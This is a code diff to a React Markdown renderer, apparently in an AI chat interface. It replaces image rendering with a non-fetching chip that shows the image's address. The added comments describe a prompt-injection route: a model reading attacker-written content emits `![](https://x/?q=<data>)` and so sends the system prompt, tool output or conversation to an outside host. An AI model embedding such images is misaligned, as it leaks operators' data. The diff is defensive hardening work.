@@ -80,6 +80,38 @@ export function Markdown({ text }: { text: string }) {
               ? <a href={safe} target="_blank" rel="noreferrer" className="text-brand underline underline-offset-2 hover:opacity-80">{children}</a>
               : <span>{children}</span>;
           },
+          // A remote image is a request the operator never made, sent the moment the text renders.
+          //
+          // The text here is the MODEL's, and a model that has read a tool result, a document or a web
+          // Page has been handed text an attacker may have written. `![](https://x/?q=<data>)` then
+          // Becomes an exfiltration channel: what leaves is not the token — that never enters the DOM
+          // — but anything the model can put in a URL (system prompt, tool output, the conversation),
+          // Plus the operator's IP and the moment they opened the page.
+          //
+          // The link handler above already refuses unknown schemes, and this is the same class with
+          // The safety inverted: a link needs a click, an image needs nothing.
+          //
+          // NO image is rendered here, rather than "remote ones only". react-markdown's own url
+          // Sanitizer already strips `data:` before this component runs — measured, the src arrives as
+          // `''` — so a `data:image/…` branch would read as a live allowance while never firing once.
+          // Everything that reaches this handler is http(s), and none of it should be fetched. The
+          // Address is still shown, so nothing is hidden from the operator.
+          img: ({ src, alt }) => {
+            // `title` carries the address even when there is an alt to show, which is the common
+            // Case — `![chart](https://…)` rendered as just "chart" and the operator had no way to
+            // See where it pointed, let alone judge it. The chip is not an <a>: opening it is a
+            // Deliberate copy-paste, not a click that a hostile alt text could solicit.
+            const address = typeof src === 'string' ? src : '';
+            return (
+              <span
+                title={address || undefined}
+                className="inline-flex max-w-full items-baseline gap-1 rounded-sm bg-foreground/10 px-1 font-mono text-[0.85em] text-muted-foreground"
+              >
+                <span aria-hidden>🖼</span>
+                <span className="truncate">{alt || address || 'image'}</span>
+              </span>
+            );
+          },
           table: ({ children }) => (
             <div className="my-1.5 overflow-x-auto rounded-md border border-border">
               <table className="w-full text-left text-xs">{children}</table>
